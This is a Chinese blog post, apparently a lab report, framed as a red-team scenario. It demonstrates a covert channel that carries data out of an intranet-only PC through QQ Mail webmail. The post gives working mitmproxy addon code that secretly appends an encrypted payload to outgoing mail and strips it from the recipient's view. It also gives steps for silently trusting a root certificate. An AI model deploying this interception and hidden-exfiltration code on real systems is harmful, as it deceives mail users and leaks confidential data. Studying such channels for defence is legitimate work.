---
title: 借助mitmproxy通过电子邮件隐式传输信息
date: 2025-03-23 20:29:17
tags: [其他, 抓包]
categories: [技术思考]
---

# 借助mitmproxy通过电子邮件隐式传输信息

## 前言

这其实是我上上周的组会周报。

**要实现的效果：**

假设邮件发送方的电脑不能连接外网只能通过自建OWA等服务向内网邮箱发送邮件，但接收方除了可以通过内网访问邮件服务接收邮件外还能连接外网。在邮件收发双方各自植入一个mitmproxy脚本，发送方脚本在发送方电脑上扫描到秘密信息想要传递出来，接收方脚本获取到秘密信息后将信息解密并悄悄传输到外网。

整个过程需要保证：收发双方在浏览器中无法察觉邮件被篡改了。

**应用场景(讲故事)：**

AB两公司都是以安全为主业的公司，B公司为了测试A公司的安全保密程度是否可靠，向A公司发起了挑战，以成功将A公司的核心电脑上的一些信息传输出来为目标。

A公司接受了这一挑战，为了防止A公司核心电脑上的内容遭到泄露，A公司将核心电脑修改为只能连接内网，A公司认为，由于B公司无法访问A公司内网，所以这样就会尽可能地安全。

但是A公司的核心电脑在某些时候仍然需要被使用，因为疫情等原因A公司有员工使用非核心电脑在家远程办公。A公司的主管有时需要使用核心电脑通过内网和非核心成员进行沟通。

B公司决定利用这一特性，想要通过A公司将邮件通过内网发送给能连接外网的非核心电脑这一特性来将核心电脑的信息传输出来。

假设B公司已经利用已有漏洞在A公司的电脑上植入了一些脚本，这些脚本可以进行如下操作：

1. 对于A公司不能联网的核心电脑，脚本读取核心电脑上的一些信息。并在核心电脑上静默安装可信任证书，使用mitmproxy工具，在核心电脑使用邮件客户端（实际上走的HTTPS协议）发送消息时，将想要传输的消息编码加密并以一定的格式附加到邮件的末尾。
2. 对于A公司能联网的非核心电脑，脚本同样通过mitmproxy，在非核心成员通过网页读取邮件时，读取邮件中附加的内容并解码，将邮件内容还原。之后由于非核心电脑能够连接公网，脚本可以直接往B公司预留接口发送加密后的信息，至此A公司只能连接内网的核心电脑上的一部分信息也被隐式地传输了出来。

这样，核心电脑和非核心电脑所能看到的都是正常的邮件，A公司很难察觉。因此，B公司胜利，成功证明了以安全为主业的A公司仍然存在安全保障不周的漏洞。

## 实现过程

### 改包

```bash
pip install mitmproxy
mitmproxy --mode transparent  # 禁止python透过防火墙的话，可能需要管理员权限下运行
# 也可以指定只捕获本机数据包：mitmproxy -s main.py --listen-host localhost，这样的话在我笔记本上实测不需要管理员权限
```

浏览器访问`http://mitm.it`下载证书并安装：

+ 双击P12文件，启动导入向导。
+ 选择证书存储位置(这将决定谁将信任该证书——仅当前Windows用户OR机器上的所有人)点击下一步。
+ 再次点击下一步。
+ 将密码留空并点击下一步。
+ 选择“将所有证书放入以下存储”，然后点击浏览，并选择“受信任的根证书颁发机构”。
+ 点击确定和下一步。
+ 点击完成。
+ 在警告对话框中点击是以确认。

这一步中，若是向“当前用户”安装证书，则不需要管理员权限。

当然也可以使用命令行添加证书（未实操）

```shell
certutil -addstore root 0.crt
```

若想编写脚本：

```python
from mitmproxy import http
import logging

logger_url = logging.getLogger('logger_url')
formatter_url = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
for handler in logger_url.handlers[:]:
    if isinstance(handler, logging.StreamHandler):
        logger_url.removeHandler(handler)
logger_url.setLevel(logging.DEBUG)
filehandler_url = logging.FileHandler('url.log')
filehandler_url.setFormatter(formatter_url)
logger_url.addHandler(filehandler_url)


logger_text = logging.getLogger('logger_text')
formatter_text = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
for handler in logger_text.handlers[:]:
    if isinstance(handler, logging.StreamHandler):
        logger_text.removeHandler(handler)
logger_text.setLevel(logging.DEBUG)
filehandler_text = logging.FileHandler('text.log')
filehandler_text.setFormatter(formatter_text)
logger_text.addHandler(filehandler_text)


def request(flow: http.HTTPFlow) -> None:
    # # 修改请求
    # if "letmefly.xyz" in flow.request.pretty_url:
    #     flow.request.headers["User-Agent"] = "Modified-Agent"
    pass

def response(flow: http.HTTPFlow) -> None:
    # 修改响应
    logger_url.info(flow.request.pretty_url)
    if "web.letmefly.xyz" in flow.request.pretty_url and 'text/html' in flow.response.headers.get('content-type', ''):
    # if flow.request.pretty_url == 'https://web.letmefly.xyz/':
        logger_url.info('replace HTML to LMTH')
        # logger_text.info(flow.response.text)
        flow.response.text = flow.response.text.replace("HTML", "LMTH")
```

设置代理服务器为`localhost:8080`，然后：

```bash
mitmproxy -s modifyPackage.py --listen-host localhost
```

结果发现：请求替换成功！

代理前：

![代理前](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/da1213d9daee496d985dceb63d8d03b9.jpeg)

<!-- ![代理前](../../binaryFiles/pics/20250308/beforeChange.jpg) -->

代理后：

![代理后](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/f12b9331cfd9410f97c11dcb5af45f36.jpeg)

<!-- ![代理后](../../binaryFiles/pics/20250308/afterchange.jpg) -->

由于具有主机操作权限，所以主机信任mitm颁发的证书，浏览器也没有任何“不安全警告”，页面就这么悄无声息地被替换了。

### 邮件发送

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from password import sender_password

# 邮件配置
smtp_server = 'smtp.qq.com'
smtp_port = 587
sender_email = 'LetMeFly666@qq.com'
sender_password = sender_password
receiver_email = 'Tisfy@qq.com'

# 创建邮件内容
subject = '这是一封正常邮件'
body = '今天中午吃饭吗'
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))

# 发送邮件
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    print("邮件发送成功")
except Exception as e:
    print(f"邮件发送失败: {e}")
finally:
    server.quit()
```

![发送成功](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/c9bc55cbd8ca40eda5e544b11d32b262.jpeg)

<!-- ![发送成功](../../binaryFiles/pics/20250308/sendok.jpg) -->

### 邮件接收

```python
import imaplib
import email
from email.header import decode_header
from password import sender_password

# 邮件配置
imap_server = 'imap.qq.com'
imap_port = 993
email_address = 'tf.li@foxmail.com'
email_password = sender_password

# 连接到IMAP服务器
try:
    mail = imaplib.IMAP4_SSL(imap_server, imap_port)
    mail.login(email_address, email_password)
    mail.select('inbox')  # 选择收件箱

    # 搜索邮件
    status, messages = mail.search(None, 'ALL')  # 获取所有邮件
    if status != 'OK':
        print("没有找到邮件")
        exit()

    # 获取邮件列表
    mail_ids = messages[0].split()
    latest_mail_id = mail_ids[-1]  # 获取最新的一封邮件

    # 获取邮件内容
    status, msg_data = mail.fetch(latest_mail_id, '(RFC822)')
    if status != 'OK':
        print("无法获取邮件内容")
        exit()

    # 解析邮件内容
    for response_part in msg_data:
        if isinstance(response_part, tuple):
            msg = email.message_from_bytes(response_part[1])
            subject, encoding = decode_header(msg['Subject'])[0]
            if isinstance(subject, bytes):
                subject = subject.decode(encoding if encoding else 'utf-8')
            from_ = msg.get('From')
            print(f"主题: {subject}")
            print(f"发件人: {from_}")

            # 获取邮件正文
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    if content_type == 'text/plain' and 'attachment' not in content_disposition:
                        body = part.get_payload(decode=True).decode()
                        print(f"正文: {body}")
            else:
                body = msg.get_payload(decode=True).decode()
                print(f"正文: {body}")

except Exception as e:
    print(f"接收邮件失败: {e}")
finally:
    mail.logout()
```

> [!CAUTION]
> 
> 在邮件接收还未认证的时候，忽然想到mitmproxy是不是只能抓HTTP(s)不能抓SMTP之类的
>
> 发了个邮件果然没抓到。。。

### 客户端发送邮件抓包

那就不模拟了，直接使用客户端发吧，这样也更真实一点。

以QQ邮件为例，发送邮件时会向`https://mail.qq.com/cgi-bin/compose_send?sid=xxxxx`发送一个POST请求，表单数据包括：

```
mailtype: 
dockey: 
bigattachcontent: 
xxxxxxxxxxx: xxxxxxxxx
sid: xxxxx
bigattachcnt: 
exstore: 
from_s: cnew
swap: 
signtype: 
newwin: 
verifykey: 
stationeryCount: 
to: "Let"<Tisfy@qq.com>
swap3: 
cc: 
subject: 今日指令
content__html: 一切正常，和昨天一样
sendmailname: tisfy@foxmail.com
savesendbox: 1
swap2: 
transattach: 
SrcMailCharset: 
xqqstyle: 
mailbgmusic: 
actiontype: send
priority: 
sendname: LetMeFly
acctid: 0 
ReAndFw: 
separatedcopy: false
fmailid: xxxx-xxxxxx
ReAndFwMailid: 
cattachelist: 
upfilelist: 
rsturl: 
fileidlist: 
t: backgroundsend
verifycode: 
verifycode_cn: 
s: comm
from: 
hitaddrbook: 0
selfdefinestation: -1
backurl: 
noatcp: 
domaincheck: 0
cgitm: 1741223758403
clitm: 1741223762955
comtm: 1741223962691
logattcnt: 0
logattsize: 0
logattmethod: 
timezone: 28800
timezone_dst: 0
resp_charset: UTF8
bgsend: 1
```

消息内容在`content__html`字段中。又觉得可行了起来。

### 客户端接收邮件抓包

当用户读取具体邮件时，会请求：`https://mail.qq.com/cgi-bin/readmail?folderid=1&folderkey=1&t=readmail&mailid=xxxx~xxx&mode=pre&maxage=3600&base=11.08&ver=13964&sid=xxxx`。

请求头之类的不重要，我们只要匹配这个url就行。

可以看到，响应体里就是一个HTML，简化后如下：

```html
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=gb18030"/>
        <title>今日指令 - QQ邮箱</title>
        <!-- 此处省略一堆script、style、meta -->
    </head>
    <body context="邮件ID" module="qmReadMail" md="md" mu="mu">
        <div class="mailcontainer" id="qqmail_mailcontainer">
            <div id="mainmail" style="position:relative;z-index:1;margin-bottom:12px;">
                <div id="contentDiv" onmouseover="getTop().stopPropagation(event);" onClick="getTop().preSwapLink(event, 'html', 'ZC0006_StHNHHSMYOYuV2cAGA~jBf3');" style="position:relative;font-size:14px;height:auto;padding:15px 15px 10px 15px;z-index:1;zoom:1;line-height:1.7;" class="body">
                    <div id="qm_con_body">
                        <div id="mailContentContainer" onClick="getTop().previewContentImage(event, '')" onMousemove="getTop().contentImgMouseOver(event, '')" onMouseout="getTop().contentImgMouseOut(event, '')" class="qmbox qm_con_body_content qqmail_webmail_only" style="opacity: 0">
                            <div id="mailcontent_image_operator" onMouseover="getTop().contentOperatorMouseOver(event)" onClick="getTop().handleOperatorClick(event)" style="position: fixed; left: 0; top: 0;">
                                <div class="operator-item" title="图片翻译" id="operator-item-translate" operate="translate">
                                    <div class="item-inner" operate="translate"></div>
                                </div>
                                <div class="operator-item" title="文字提取" id="operator-item-extract" operate="extract">
                                    <div class="item-inner" operate="extract"></div>
                                </div>
                                <div class="operator-item" title="导出表格" id="operator-item-form" operate="form">
                                    <div class="item-inner" operate="form"></div>
                                </div>
                                <div class="operator-item" title="下载图片" id="operator-item-download" operate="download">
                                    <div class="item-inner" operate="download"></div>
                                </div>
                            </div>
                            <script>
                                document.addEventListener('DOMContentLoaded', function() {
                                    getTop().handleScanContentImage('ZC0006_StHNHHSMYOYuV2cAGA~jBf3');
                                })
                            </script>
                            <style>
                                /* 邮件内部图片支持调起预览。 */
                                img[image-inside-content='1'] {
                                    cursor: pointer;
                                }
                            </style>
                            一切正常，和昨天一样<style type="text/css">
                                .qmbox style, .qmbox script, .qmbox head, .qmbox link, .qmbox meta {
                                    display: none !important;
                                }
                            </style>
                        </div>
                    </div>
                    <!-- -->
                    <style>
                        #mailContentContainer .txt {
                            height: auto;
                        }
                    </style>
                </div>
            </div>
        </div>
    </body>
</html>
<!-- 此处省略一堆script -->
```

发送的邮件主体就出现在简化后的HTML的第38行。

在研究期间还看到了一个有点意思的图，mark一下：

![stream](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/9cfd3e3e48c641f4a12a7a82cd53c44f.png)

<!-- ![stream](../../binaryFiles/pics/20250308/stream.png) -->

### 消息验证 - 发送邮件时后台篡改

```python
from mitmproxy import http
from urllib.parse import parse_qs, urlencode
import logging

logger_url = logging.getLogger('logger_url')
formatter_url = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
for handler in logger_url.handlers[:]:
    if isinstance(handler, logging.StreamHandler):
        logger_url.removeHandler(handler)
logger_url.setLevel(logging.DEBUG)
filehandler_url = logging.FileHandler('url.log')
filehandler_url.setFormatter(formatter_url)
logger_url.addHandler(filehandler_url)


class AddSignatureAddon:
    def request(self, flow: http.HTTPFlow) -> None:
        # 检查目标路径和请求方法
        if flow.request.method == "POST" and "/cgi-bin/compose_send" in flow.request.url:
            # 确保Content-Type正确
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                # 解析原始表单数据
                try:
                    parsed_data = parse_qs(flow.request.content.decode("utf-8"))
                except Exception as e:
                    logger_url(f"解析表单数据失败: {e}")
                    return

                # 修改content__html字段
                if "content__html" in parsed_data and parsed_data["content__html"]:
                    original_content = parsed_data["content__html"][0]
                    new_content = original_content + "*******计划有变*******"
                    parsed_data["content__html"][0] = new_content

                    # 重新编码并更新请求内容
                    updated_content = urlencode(parsed_data, doseq=True).encode("utf-8")
                    flow.request.content = updated_content
                    logger_url("成功添加签名！")
                else:
                    logger_url("未找到content__html字段")

addons = [AddSignatureAddon()]
```

设置代理服务器为`localhost:8080`，然后：

```bash
mitmproxy -s modifyPackage.py --listen-host localhost
```

发送邮件，可以看到网页端没有任何异常，浏览器控制台也一切正常。

但是实际发出的邮件就不一样了，多了一段`*******签名*******`

![实际邮件](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/05238e8a521644abacb6decabde5dc7b.png)

<!-- ![实际邮件](../../binaryFiles/pics/20250308/realEmail.png) -->

### 消息验证 - 收到邮件时后台篡改

```python
def response(self, flow: http.HTTPFlow) -> None:
    if flow.request.method == 'GET' and '/cgi-bin/readmail' in flow.request.url:

        if "text/html" not in flow.response.headers.get("Content-Type", ""):
            return
        # 解析HTML
        soup = BeautifulSoup(flow.response.content, "lxml")
        content_div = soup.find("div", {"id": "mailContentContainer"})
        logger.info(f'{content_div}')
        if not content_div:
            return

        # 提取所有文本节点
        text_nodes = content_div.find_all(text=True, recursive=True)
        for node in text_nodes:
            # 匹配签名模式（支持动态内容）
            match = re.search(r'\*{7}(.*?)\*{7}', node.string)
            if match:
                signature = match.group(1)
                print(f"提取到签名：{signature}")
                clean_text = re.sub(r'\*{7}.*?\*{7}', '', node.string)
                node.replace_with(clean_text)

        # 更新响应内容
        flow.response.content = str(soup).encode("utf-8")
        flow.response.headers["Content-Length"] = str(len(flow.response.content))
```

等下，篡改失败了？

仔细一看，response中有这么一段：

```html
<meta http-equiv="Content-Type" content="text/html; charset=gb18030"/>
```

logging的日志也显示乱码。

通过解码后能正常解析并修改原文内容了

```python
def response(self, flow: http.HTTPFlow) -> None:
    if flow.request.method == 'GET' and '/cgi-bin/readmail' in flow.request.url:
        if "text/html" not in flow.response.headers.get("Content-Type", ""):
            return
        try:
            html_content = flow.response.content.decode("gb18030")
        except UnicodeDecodeError:
            logger.info('解码失败：可能不是GB18030编码')
        soup = BeautifulSoup(html_content, "lxml")
        content_div = soup.find("div", {"id": "mailContentContainer"})
        logger.info(f'{content_div}')
        if not content_div:
            return

        # 提取所有文本节点
        text_nodes = content_div.find_all(text=True, recursive=True)
        for node in text_nodes:
            # 匹配签名模式（支持动态内容）
            match = re.search(r'\*{7}(.*?)\*{7}', node.string)
            if match:
                signature = match.group(1)
                print(f"提取到签名：{signature}")
                clean_text = re.sub(r'\*{7}.*?\*{7}', '', node.string)
                node.replace_with(clean_text)

        # 更新响应内容
        flow.response.content = str(soup).encode("gb18030")
        flow.response.headers["Content-Length"] = str(len(flow.response.content))
```

但是通过抓包可以发现，通过beautifulsoup解析html并重新编码html，产生内容还是会稍有不同：

1. header：原始编码为`gb18030`，但decode并由BS解析后就变成了`utf-8`

    原来：

    ```html
    <meta http-equiv="Content-Type" content="text/html; charset=gb18030"/>
    ````

    解析后：

    ```html
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
    ```

2. 有些细节和原来内容不完全一致

    例如1.中的顺序，原来是先`http-equiv`后`content`，结果变成了先`content`后`http-equiv`

    还有的`&nbsp;`会被直接由空格代替。

解决方法有二：

1. 令BS树的编码方式为gb18030
2. 不BS树，直接用正则解析

使用方法一：

```python
meta_tag = soup.find("meta", attrs={"http-equiv": "Content-Type"})
if meta_tag:
    meta_tag["content"] = "text/html; charset=gb18030"
```

抓包发现meta content的内容正常了，但邮件直接全部不显示。

肉眼可见BS对原文内容进行了很多修改，于是决定使用方案二

```python
try:
    html_content = flow.response.content.decode("gb18030")
except UnicodeDecodeError:
    logger.info('解码失败：可能不是GB18030编码')
match = re.search(r'\*{7}(.*?)\*{7}', html_content)
if match:
    signature = match.group(1)
    logger.info(f"提取到签名：{signature}")
    html_content = re.sub(r'\*{7}.*?\*{7}', '', html_content)
flow.response.content = html_content.encode("gb18030")
flow.response.headers["Content-Length"] = str(len(flow.response.content))
```

然后功能实现了

![没有隐藏信息](https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/308711a1afdb43548e07ece916e7cc62.png)

<!-- ![没有隐藏信息](../../binaryFiles/pics/20250308/noHiddenMessage.png) -->

### 展示工作

所有所需功能已经实现，接下来就是演示了。

发送端：一个小黑框，接收想要隐蔽传递的信息

接收端：一个小黑框，显示接收到的隐藏信息

```
今日指令

今日跑步挑战：今天每人跑步10000米，保持健康，突破自我！
（记录时间：，完成情况：）

今日阅读任务：今天每人阅读50页书，提升知识储备，开阔视野。
（书名：，进度：）

今日饮水目标：今天每人饮水2000毫升，保持身体水分平衡。
（完成杯数：，剩余目标：）

今日学习时间：今天每人学习2小时，专注于技能提升或兴趣培养。
（学习内容：，完成情况：）

今日冥想练习：今天每人冥想15分钟，放松身心，提升专注力。
（冥想主题：，感受：）

今日写作任务：今天每人写作500字，记录生活或创作故事。
（写作主题：，完成字数：）

今日蔬果摄入：今天每人摄入5份蔬果，保持均衡饮食。
（蔬果种类：，完成份数：）

今日早睡目标：今天每人晚上10点前入睡，保证充足睡眠。
（实际入睡时间：，睡眠质量：）

今日感恩记录：今天每人记录3件值得感恩的事，培养积极心态。
（感恩事项：1.____ 2.____ 3.____）

今日运动打卡：今天每人完成30分钟运动，形式不限（跑步、瑜伽、健身等）。
（运动类型：，完成时长：）
```

### 最终代码

改包：

```python
from mitmproxy import http
from urllib.parse import parse_qs, urlencode
import logging
import re

logger = logging.getLogger('logger_url')
formatter_url = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
for handler in logger.handlers[:]:
    if isinstance(handler, logging.StreamHandler):
        logger.removeHandler(handler)
logger.setLevel(logging.DEBUG)
filehandler_url = logging.FileHandler('url.log')
filehandler_url.setFormatter(formatter_url)
logger.addHandler(filehandler_url)
logger.info('url log init')


# logger_text = logging.getLogger('logger_text')
# formatter_text = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
# for handler in logger_text.handlers[:]:
#     if isinstance(handler, logging.StreamHandler):
#         logger_text.removeHandler(handler)
# logger_text.setLevel(logging.DEBUG)
# filehandler_text = logging.FileHandler('text.log')
# filehandler_text.setFormatter(formatter_text)
# logger_text.addHandler(filehandler_text)


# def request(flow: http.HTTPFlow) -> None:
#     # 修改请求
#     # if "letmefly.xyz" in flow.request.pretty_url:
#     if "web.letmefly.xyz" in flow.request.pretty_url and 'text/html' in flow.response.headers.get('content-type', ''):
#         # flow.request.headers["User-Agent"] = "Modified-Agent"
#         flow.request.text  # 暂时未知
#     pass

# def response(flow: http.HTTPFlow) -> None:
#     # 修改响应
#     logger.info(flow.request.pretty_url)
#     if "web.letmefly.xyz" in flow.request.pretty_url and 'text/html' in flow.response.headers.get('content-type', ''):
#     # if flow.request.pretty_url == 'https://web.letmefly.xyz/':
#         logger.info('replace HTML to LMTH')
#         # logger_text.info(flow.response.text)
#         flow.response.text = flow.response.text.replace("HTML", "LMTH")

# https://chat.deepseek.com/a/chat/s/354e2ce6-8c46-41f3-b32b-944407aaf2f1
class AddSignatureAddon:
    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST" and "/cgi-bin/compose_send" in flow.request.url:
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" not in content_type:
                return
            # 解析原始表单数据
            try:
                parsed_data = parse_qs(flow.request.content.decode("utf-8"))
            except Exception as e:
                logger.info(f"解析表单数据失败: {e}")
                return

            # 修改content__html字段
            if "content__html" in parsed_data and parsed_data["content__html"]:
                original_content = parsed_data["content__html"][0]
                try:
                    with open('letsender', 'r', encoding='utf-8') as f:
                        hiddenMsg = f.read()
                except:
                    hiddenMsg = '计划有变'
                new_content = original_content + f"*******{hiddenMsg}*******"
                parsed_data["content__html"][0] = new_content

                # 重新编码并更新请求内容
                updated_content = urlencode(parsed_data, doseq=True).encode("utf-8")
                flow.request.content = updated_content
                logger.info("成功添加签名！")
            else:
                logger.info("未找到content__html字段")
    
    def response(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == 'GET' and '/cgi-bin/readmail' in flow.request.url:
            if "text/html" not in flow.response.headers.get("Content-Type", ""):
                return
            try:
                html_content = flow.response.content.decode("gb18030")
            except UnicodeDecodeError:
                logger.info('解码失败：可能不是GB18030编码')
            # soup = BeautifulSoup(html_content, "lxml")
            # content_div = soup.find("div", {"id": "mailContentContainer"})
            # logger.info(f'{content_div}')
            # if not content_div:
            #     return
            # text_nodes = content_div.find_all(text=True, recursive=True)
            # for node in text_nodes:
            #     # 匹配签名模式（支持动态内容）
            #     match = re.search(r'\*{7}(.*?)\*{7}', node.string)
            #     if match:
            #         signature = match.group(1)
            #         print(f"提取到签名：{signature}")
            #         clean_text = re.sub(r'\*{7}.*?\*{7}', '', node.string)
            #         node.replace_with(clean_text)
            # # 不知道为啥，BS解析后直接把头部的编码给改了
            # meta_tag = soup.find("meta", attrs={"http-equiv": "Content-Type"})
            # if meta_tag:
            #     meta_tag["content"] = "text/html; charset=gb18030"
            match = re.search(r'\*{7}(.*?)\*{7}', html_content)
            if match:
                signature = match.group(1)
                logger.info(f"提取到签名：{signature}")
                with open('letreceiver', 'w', encoding='utf-8') as f:
                    f.write(signature)
                html_content = re.sub(r'\*{7}.*?\*{7}', '', html_content)
            flow.response.content = html_content.encode("gb18030")
            flow.response.headers["Content-Length"] = str(len(flow.response.content))

addons = [AddSignatureAddon()]
```

发送方demo：

```python
while True:
    data = input('想隐蔽传输的信息：')
    with open('letsender', 'w', encoding='utf-8') as f:
        f.write(data)
```

接收方demo：

```python
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import os

FILE_PATH = 'letreceiver'

if not os.path.exists(FILE_PATH):
    os.system(f'echo > {FILE_PATH}')

class FileChangeHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if event.src_path.endswith(FILE_PATH):
            print(f"File {FILE_PATH} has been modified. Reading new content...")
            self.read_file_content()

    def read_file_content(self):
        try:
            with open(FILE_PATH, 'r', encoding='utf-8') as file:
                content = file.read()
                print("New content:")
                print(content)
        except Exception as e:
            print(f"Error reading file: {e}")

if __name__ == "__main__":
    # 创建事件处理器和观察者
    event_handler = FileChangeHandler()
    observer = Observer()
    observer.schedule(event_handler, path='.', recursive=False)

    # 启动观察者
    observer.start()
    print(f"Started watching {FILE_PATH} for changes...")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()

    observer.join()
```

### 提升

当然也可以通过AES加密

首先随机生成个AES密钥：

```python
from Crypto.Random import get_random_bytes

# 生成256位（32字节）AES密钥
key = get_random_bytes(32)
print("AES Key:", key.hex())
```

这里我们约定密钥为：`e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882`。

当然，在实际执行的时候，密钥可不能公布出来。

然后开始使用密钥加密解密：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


def encrypt_aes(plaintext: str, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC)  # 使用CBC模式
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return cipher.iv + ct_bytes  # 返回IV + 密文


def decrypt_aes(ciphertext: bytes, key: bytes) -> str:
    iv = ciphertext[:AES.block_size]
    ct = ciphertext[AES.block_size:]  # 密文
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

msg = '其实今天要进攻'
key = bytes.fromhex('e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882')  # 演示用，实际可别公布
encrypted = encrypt_aes(msg, key)
print(encrypted.hex())
decrypt = decrypt_aes(encrypted, key)
print(decrypt)
```

运行结果：

```
PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py
a41c71290d5ebc864b0feef9537a407d8b55504148bc0755b079cd4d1005cc7b80e9a98ec1df78a858a9ca8020208fc4
其实今天要进攻
PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py
668c2d139c5729d432f403fa9bfad77fdb9c38cc0ae2f8dd66deff7141b656a46b36a3d2d82b8da07ee2a1e9c1179ee7
其实今天要进攻
PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py
0a6b612c98f3d602f6185adf560d5467f3f4ca1505d6f913552a4d9de459f95cdeb25c3195410e50d3ffd40297e164e0
其实今天要进攻
PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py
75e3cd8c45bd2223021b90deeec8352ca9bdd4f9bf816f03064099139541fa37b33a2b79e7d3a749c51ef7d4ec2a1dc1
其实今天要进攻
PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py
a5d65efb6037ca9ff21d0aef20a03d1289cc6feb0f1616ebe49c4458c686a6a7da405fdeab7a2a706190783d3f9b7bd9
其实今天要进攻
```

不难发现，每次加密出来的结果都不一样，这就避免了“统计每个字符频率”等破解方法。

之后就是收发双方以此为依据进行数据加密与解密了。

## End

> 同步发文于[CSDN](https://letmefly.blog.csdn.net/article/details/146461437)和我的[个人博客](https://blog.letmefly.xyz/)，原创不易，转载经作者同意后请附上[原文链接](https://blog.letmefly.xyz/2025/03/23/Other-Network-HowToSendHiddenMsgThroughEmailWithMitmproxy/)哦~
>
> 千篇源码题解[已开源](https://github.com/LetMeFly666/LeetCode)
